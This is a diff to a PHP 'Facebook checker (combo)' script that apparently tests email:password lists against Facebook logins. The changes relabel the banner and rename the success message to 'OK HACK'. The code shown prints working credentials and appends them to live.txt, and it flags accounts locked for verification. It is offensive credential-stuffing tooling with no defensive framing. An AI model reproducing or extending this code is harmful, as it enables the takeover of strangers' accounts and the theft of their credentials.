@@ -4,7 +4,7 @@ $cyan = "\e[1;96m";
 $yl = " \e[1;36";
 echo "$cyan+------------------------------------------------+
 
-    ".date("Y-m-d H:i:s")."     FACEBOOK CHECKER
+    ".date("Y-m-d H:i:s")."     FACEBOOK CHECKER (COMBO)
  ______        _       _______     ___  ____   
 |_   _ `.     / \     |_   __ \   |_  ||_  _|  
   | | `. \   / _ \      | |__) |    | |_/ /    
@@ -48,7 +48,7 @@ function cekfb($email, $passwd) {
 	  //echo "\e[1;34m";
     $empas = $email.":".$passwd;
     if(isset($hasilcreate->access_token)) { 
-        echo "\e[1;92m============[OK]============\e[1;0m\n"."\e[1;92m"."E-mail ==> ". $email."\nPassWord ==> ".$passwd."\n============[DARK]============\n".PHP_EOL;
+        echo "\e[1;92m============[OK HACK]============\e[1;0m\n"."\e[1;92m"."E-mail ==> ". $email."\nPassWord ==> ".$passwd."\n============[DARK]============\n".PHP_EOL;
         file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
     }elseif($hasilcreate->error_code == 405 || preg_match("/User must verify their account/i", $hasilcreate->error_msg)) {
 		echo  "\e[1;91m==========[BAD 7DAY]==========\e[1;0m\n"."\e[1;91m"."E-mail ==> ".$email."\nPassWord ==> ".$passwd."\n============[DARK]============\n".PHP_EOL;
